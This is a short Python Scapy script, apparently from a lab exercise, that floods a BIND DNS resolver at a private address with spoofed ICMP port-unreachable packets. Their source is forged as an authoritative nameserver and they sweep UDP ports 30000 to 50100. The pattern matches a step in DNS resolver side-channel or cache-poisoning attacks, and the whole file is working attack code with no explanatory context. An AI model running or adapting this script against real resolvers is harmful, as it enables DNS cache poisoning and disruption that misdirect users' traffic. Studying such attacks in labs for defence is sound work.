from scapy.all import *
import random

victim_ip = "10.9.0.20"     # IP of the Victim (BIND resolver)
spoofed_ip = "1.2.3.4"      # Spoofed Authoritative NS IP
start_port = 30000
end_port = 50100            # Short range for quick test

for port in range(start_port, end_port):
    pkt = IP(src=spoofed_ip, dst=victim_ip) / ICMP(type=3, code=3) / UDP(dport=port, sport=53)
    send(pkt, verbose=0)
    print("Sent spoofed ICMP to port {}".format(port))

